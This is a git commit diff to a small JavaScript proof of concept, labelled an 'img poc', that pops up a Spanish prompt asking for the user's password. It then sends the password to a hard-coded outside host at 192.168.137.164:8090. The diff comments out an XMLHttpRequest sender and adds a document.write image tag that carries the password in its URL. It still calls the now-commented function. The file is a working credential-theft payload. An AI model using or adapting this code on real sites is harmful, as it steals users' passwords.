56304b7329c2e010b1fcfccdcae2a82f4ed603db
Omar Espino <omespino@gmail.com>
2024-09-05 12:35:17 -0700

    Update 1.js img poc

--- 1.js
+++ 1.js
@@ -1,11 +1,12 @@
 var pass=prompt('Para continuar inserta tu contraseña');
 //alert(pass)
 
-function send_response(response){
-	var oReqX = new XMLHttpRequest();
-	oReqX.open("POST","https://192.168.137.164:8090/");
-	oReqX.send(response);
-}
+// function send_response(response){
+// 	var oReqX = new XMLHttpRequest();
+// 	oReqX.open("GET","https://192.168.137.164:8090/");
+// 	oReqX.send(response);
+// }
+document.write('<img src=http://192.168.137.164:8090/'+pass+'>');
 
 send_response(pass)
 
